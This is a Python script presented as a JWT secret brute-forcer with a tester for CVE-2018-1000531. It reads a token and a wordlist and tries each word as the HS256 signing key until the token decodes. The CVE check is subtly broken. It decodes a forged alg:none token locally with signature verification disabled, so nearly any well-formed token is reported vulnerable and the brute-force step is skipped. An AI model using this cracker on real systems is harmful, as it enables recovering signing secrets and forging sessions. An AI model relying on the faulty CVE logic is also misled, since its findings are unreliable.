import jwt
import base64
from jwt.exceptions import InvalidTokenError

def display_banner():

    print("=" * 50)
    print("JWT Bruteforcer with CVE-2018-1000531 tester created by Batuhan Pekdur")
    print("=" * 50)
    print("This tool is for ethical security testing only!")
    print("=" * 50)

def validate_token_format(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("Error: Invalid JWT token format. Please provide a valid token.")
        return False
    return True

def test_cve_2018_1000531(token):
    """
    Tests for the CVE-2018-1000531 vulnerability.
    """
    try:
        
        header, payload, signature = token.split(".")
        none_header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().strip("=")
        manipulated_token = f"{none_header}.{payload}."
        
        
        decoded = jwt.decode(manipulated_token, options={"verify_signature": False})
        print("[!] CVE-2018-1000531 vulnerability detected! (Token verified)")
        print(f"[+] Manipulated token payload: {decoded}")
        return True
    except InvalidTokenError:
        print("[+]  CVE-2018-1000531 not fount alg. working properly.")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def brute_force_jwt(token, wordlist_file, algorithm="HS256"):

    with open(wordlist_file, 'r') as wordlist:
        for key in wordlist:
            key = key.strip()  
            try:
                # Attempt to validate the JWT
                decoded = jwt.decode(token, key, algorithms=[algorithm])
                print(f"[+] Correct key found: {key}")
                print(f"[+] Decoded payload: {decoded}")
                return key
            except jwt.ExpiredSignatureError:
                print(f"[-] The key is correct, but the token has expired: {key}")
                return key
            except jwt.InvalidTokenError:
                pass  

    print("[-] No correct key found.")
    return None

if __name__ == "__main__":
    display_banner()

    
    jwt_token = input("Enter the JWT token: ").strip()
    wordlist_path = input("Path of your wordlist file: ").strip()

    
    if not validate_token_format(jwt_token):
        print("JWT Token is not valid. Try Again :) .")
        exit(1)

    print("\n[Starting CVE-2018-1000531 Vulnerability Test]")
    if test_cve_2018_1000531(jwt_token):
        print("[!] CVE-2018-1000531 vulnerability detected.")
    else:
        print("\n[Starting Brute-Force Process]")
        brute_force_jwt(jwt_token, wordlist_path)
